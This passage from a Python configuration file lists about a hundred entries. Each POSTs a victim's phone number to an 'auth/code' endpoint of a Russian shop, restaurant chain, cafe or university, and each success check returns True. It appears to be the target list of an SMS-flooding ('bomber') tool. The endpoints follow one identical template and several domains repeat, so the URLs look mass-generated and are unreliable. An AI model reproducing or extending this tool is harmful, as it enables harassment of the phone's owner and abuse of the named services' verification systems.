        "headers": lambda: get_common_headers("https://music.apple.com/", "https://music.apple.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1517": {
        "name": "YouTubeMusic",
        "url": "https://music.youtube.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://music.youtube.com/", "https://music.youtube.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1518": {
        "name": "TidalRu",
        "url": "https://tidal.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tidal.com/", "https://tidal.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1519": {
        "name": "QobuzRu",
        "url": "https://qobuz.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://qobuz.com/", "https://qobuz.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1520": {
        "name": "SoundcloudRu",
        "url": "https://soundcloud.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://soundcloud.com/", "https://soundcloud.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1521": {
        "name": "DeliveryClub",
        "url": "https://delivery-club.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://delivery-club.ru/", "https://delivery-club.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1522": {
        "name": "YandexEda",
        "url": "https://eda.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://eda.yandex.ru/", "https://eda.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1523": {
        "name": "Samokat",
        "url": "https://samokat.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://samokat.ru/", "https://samokat.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1524": {
        "name": "Utkonos",
        "url": "https://utkonos.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://utkonos.ru/", "https://utkonos.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1525": {
        "name": "LentaOnline",
        "url": "https://lenta.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lenta.com/", "https://lenta.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1526": {
        "name": "Pyaterochka",
        "url": "https://5ka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://5ka.ru/", "https://5ka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1527": {
        "name": "Perekrestok",
        "url": "https://perekrestok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://perekrestok.ru/", "https://perekrestok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1528": {
        "name": "AuchanRu",
        "url": "https://auchan.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://auchan.ru/", "https://auchan.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1529": {
        "name": "MetroCCRu",
        "url": "https://online.metro-cc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://online.metro-cc.ru/", "https://online.metro-cc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1530": {
        "name": "MagnitDelivery",
        "url": "https://magnit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://magnit.ru/", "https://magnit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1531": {
        "name": "VkusVill",
        "url": "https://vkusvill.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vkusvill.ru/", "https://vkusvill.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1532": {
        "name": "BillaRu",
        "url": "https://billa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://billa.ru/", "https://billa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1533": {
        "name": "Dixy",
        "url": "https://dixy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dixy.ru/", "https://dixy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1534": {
        "name": "KrasnoeBely",
        "url": "https://kras-bel.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kras-bel.ru/", "https://kras-bel.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1535": {
        "name": "Bристоль",
        "url": "https://bristol.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bristol.ru/", "https://bristol.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1536": {
        "name": "Oкей",
        "url": "https://okmarket.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://okmarket.ru/", "https://okmarket.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1537": {
        "name": "LentaCard",
        "url": "https://lenta.com/card/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://lenta.com/", "https://lenta.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1538": {
        "name": "X5Group",
        "url": "https://x5.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://x5.ru/", "https://x5.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1539": {
        "name": "Foodband",
        "url": "https://foodband.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://foodband.ru/", "https://foodband.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1540": {
        "name": "Tanuki",
        "url": "https://tanuki.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tanuki.ru/", "https://tanuki.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1541": {
        "name": "Yakitoria",
        "url": "https://yakitoria.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yakitoria.ru/", "https://yakitoria.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1542": {
        "name": "DominosRu",
        "url": "https://dominos.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dominos.ru/", "https://dominos.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1543": {
        "name": "PapaJohnsRu",
        "url": "https://papajohns.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://papajohns.ru/", "https://papajohns.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1544": {
        "name": "DodoPizza",
        "url": "https://dodopizza.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dodopizza.ru/", "https://dodopizza.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1545": {
        "name": "BurgerKingRu",
        "url": "https://burgerking.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://burgerking.ru/", "https://burgerking.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1546": {
        "name": "KFC_Ru",
        "url": "https://kfc.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kfc.ru/", "https://kfc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1547": {
        "name": "Rostiks",
        "url": "https://rostiks.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rostiks.ru/", "https://rostiks.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1548": {
        "name": "VkusnoItochka",
        "url": "https://vkusnoitochka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vkusnoitochka.ru/", "https://vkusnoitochka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1549": {
        "name": "Teremok",
        "url": "https://teremok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://teremok.ru/", "https://teremok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1550": {
        "name": "MooMoo",
        "url": "https://cafe-mu-mu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cafe-mu-mu.ru/", "https://cafe-mu-mu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1551": {
        "name": "Shokoladnitsa",
        "url": "https://shoko.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://shoko.ru/", "https://shoko.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1552": {
        "name": "CoffeeHouse",
        "url": "https://coffeehouse.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://coffeehouse.ru/", "https://coffeehouse.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1553": {
        "name": "StarbucksRu",
        "url": "https://starscoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://starscoffee.ru/", "https://starscoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1554": {
        "name": "DunkinDonutsRu",
        "url": "https://dunkindonuts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dunkindonuts.ru/", "https://dunkindonuts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1555": {
        "name": "SubwayRu",
        "url": "https://subway.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://subway.ru/", "https://subway.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1556": {
        "name": "BaskinRobbinsRu",
        "url": "https://baskinrobbins.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://baskinrobbins.ru/", "https://baskinrobbins.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1557": {
        "name": "CinnabonRu",
        "url": "https://cinnabonrussia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cinnabonrussia.com/", "https://cinnabonrussia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1558": {
        "name": "TajiKistanExpress",
        "url": "https://taji.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://taji.ru/", "https://taji.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1559": {
        "name": "ChaihonaNo1",
        "url": "https://chaihona.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chaihona.ru/", "https://chaihona.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1560": {
        "name": "GinzaProject",
        "url": "https://ginza.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ginza.ru/", "https://ginza.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1561": {
        "name": "Rosinter",
        "url": "https://rosinter.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosinter.ru/", "https://rosinter.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1562": {
        "name": "ILPatio",
        "url": "https://ilpatio.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ilpatio.ru/", "https://ilpatio.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1563": {
        "name": "PlanetaSushi",
        "url": "https://planetasushi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://planetasushi.ru/", "https://planetasushi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1564": {
        "name": "TGIFridaysRu",
        "url": "https://tgifridays.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tgifridays.ru/", "https://tgifridays.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1565": {
        "name": "SbarroRu",
        "url": "https://sbarro.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sbarro.ru/", "https://sbarro.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1566": {
        "name": "CostaCoffeeRu",
        "url": "https://costacoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://costacoffee.ru/", "https://costacoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1567": {
        "name": "OnePriceCoffee",
        "url": "https://onepricecoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://onepricecoffee.ru/", "https://onepricecoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1568": {
        "name": "SkuratovCoffee",
        "url": "https://skuratovcoffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://skuratovcoffee.ru/", "https://skuratovcoffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1569": {
        "name": "DoubleB",
        "url": "https://doubleb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://doubleb.ru/", "https://doubleb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1570": {
        "name": "ABCkofeynya",
        "url": "https://abc-coffee.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://abc-coffee.ru/", "https://abc-coffee.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1571": {
        "name": "Mendeleev",
        "url": "https://mendeleev.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mendeleev.ru/", "https://mendeleev.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1572": {
        "name": "UniversitiesRu",
        "url": "https://universities.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://universities.ru/", "https://universities.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1573": {
        "name": "MSU",
        "url": "https://msu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://msu.ru/", "https://msu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1574": {
        "name": "SPbU",
        "url": "https://spbu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://spbu.ru/", "https://spbu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1575": {
        "name": "HSE",
        "url": "https://hse.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hse.ru/", "https://hse.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1576": {
        "name": "MIPT",
        "url": "https://mipt.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mipt.ru/", "https://mipt.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1577": {
        "name": "Bauman",
        "url": "https://bmstu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bmstu.ru/", "https://bmstu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1578": {
        "name": "MEPhI",
        "url": "https://mephi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mephi.ru/", "https://mephi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1579": {
        "name": "ITMO",
        "url": "https://itmo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://itmo.ru/", "https://itmo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1580": {
        "name": "MGIMO",
        "url": "https://mgimo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mgimo.ru/", "https://mgimo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1581": {
        "name": "RANEPA",
        "url": "https://ranepa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ranepa.ru/", "https://ranepa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1582": {
        "name": "FinancialUniversity",
        "url": "https://fa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fa.ru/", "https://fa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1583": {
        "name": "MISiS",
        "url": "https://misis.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://misis.ru/", "https://misis.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1584": {
        "name": "MAI",
        "url": "https://mai.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mai.ru/", "https://mai.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1585": {
        "name": "MADI",
        "url": "https://madi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://madi.ru/", "https://madi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1586": {
        "name": "MEI",
        "url": "https://mpei.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mpei.ru/", "https://mpei.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1587": {
        "name": "RGGU",
        "url": "https://rggu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rggu.ru/", "https://rggu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1588": {
        "name": "RGSU",
        "url": "https://rgsu.net/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rgsu.net/", "https://rgsu.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1589": {
        "name": "SechenovUni",
        "url": "https://sechenov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sechenov.ru/", "https://sechenov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1590": {
        "name": "PirogovUni",
        "url": "https://rsmu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rsmu.ru/", "https://rsmu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1591": {
        "name": "YarGU",
        "url": "https://uniyar.ac.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uniyar.ac.ru/", "https://uniyar.ac.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1592": {
        "name": "UrFU",
        "url": "https://urfu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://urfu.ru/", "https://urfu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1593": {
        "name": "NSU",
        "url": "https://nsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nsu.ru/", "https://nsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1594": {
        "name": "TPU",
        "url": "https://tpu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tpu.ru/", "https://tpu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1595": {
        "name": "TSU",
        "url": "https://tsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tsu.ru/", "https://tsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1596": {
        "name": "KFU",
        "url": "https://kpfu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kpfu.ru/", "https://kpfu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1597": {
        "name": "FEFU",
        "url": "https://dvfu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dvfu.ru/", "https://dvfu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1598": {
        "name": "SFU",
        "url": "https://sfu-kras.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sfu-kras.ru/", "https://sfu-kras.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1599": {
        "name": "SouthernFederal",
        "url": "https://sfedu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sfedu.ru/", "https://sfedu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1600": {
        "name": "BalticFederal",
        "url": "https://kantiana.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kantiana.ru/", "https://kantiana.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1601": {
        "name": "BSU",
        "url": "https://bsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bsu.ru/", "https://bsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1602": {
        "name": "PSU",
        "url": "https://psu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://psu.ru/", "https://psu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1603": {
        "name": "VSU",
        "url": "https://vsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vsu.ru/", "https://vsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1604": {
        "name": "LobachevskyUni",
        "url": "https://unn.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://unn.ru/", "https://unn.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1605": {
        "name": "SamaraUni",
        "url": "https://ssau.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ssau.ru/", "https://ssau.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1606": {
        "name": "SaratovUni",
        "url": "https://sgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sgu.ru/", "https://sgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1607": {
        "name": "VoronezhUni",
        "url": "https://vsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vsu.ru/", "https://vsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1608": {
        "name": "KubanUni",
        "url": "https://kubsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kubsu.ru/", "https://kubsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1609": {
        "name": "ChelyabinskUni",
        "url": "https://csu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://csu.ru/", "https://csu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1610": {
        "name": "PermUni",
        "url": "https://psu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://psu.ru/", "https://psu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1611": {
        "name": "OmskUni",
        "url": "https://omsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://omsu.ru/", "https://omsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1612": {
        "name": "AltaiUni",
        "url": "https://asu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://asu.ru/", "https://asu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1613": {
        "name": "IrkutskUni",
        "url": "https://isu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://isu.ru/", "https://isu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1614": {
        "name": "BashkirUni",
        "url": "https://bashedu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bashedu.ru/", "https://bashedu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1615": {
        "name": "PetrozavodskUni",
        "url": "https://petrsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://petrsu.ru/", "https://petrsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1616": {
        "name": "MariUni",
        "url": "https://marsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://marsu.ru/", "https://marsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1617": {
        "name": "MordoviaUni",
        "url": "https://mrsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mrsu.ru/", "https://mrsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1618": {
        "name": "UdmurtUni",
        "url": "https://udsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://udsu.ru/", "https://udsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1619": {
        "name": "ChuvashUni",
        "url": "https://chuvsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chuvsu.ru/", "https://chuvsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1620": {
        "name": "YakutUni",
        "url": "https://s-vfu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://s-vfu.ru/", "https://s-vfu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1621": {
        "name": "BuryatUni",
        "url": "https://bsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://bsu.ru/", "https://bsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1622": {
        "name": "TuvaUni",
        "url": "https://tgu.su/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tgu.su/", "https://tgu.su", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1623": {
        "name": "KalmykUni",
        "url": "https://kalmsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kalmsu.ru/", "https://kalmsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1624": {
        "name": "DagestanUni",
        "url": "https://dgu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dgu.ru/", "https://dgu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1625": {
        "name": "ChechenUni",
        "url": "https://chesu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chesu.ru/", "https://chesu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1626": {
        "name": "IngushUni",
        "url": "https://inggu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://inggu.ru/", "https://inggu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1627": {
        "name": "NorthOssetianUni",
        "url": "https://nosu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nosu.ru/", "https://nosu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1628": {
        "name": "KabardinoBalkarUni",
        "url": "https://kbsu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kbsu.ru/", "https://kbsu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
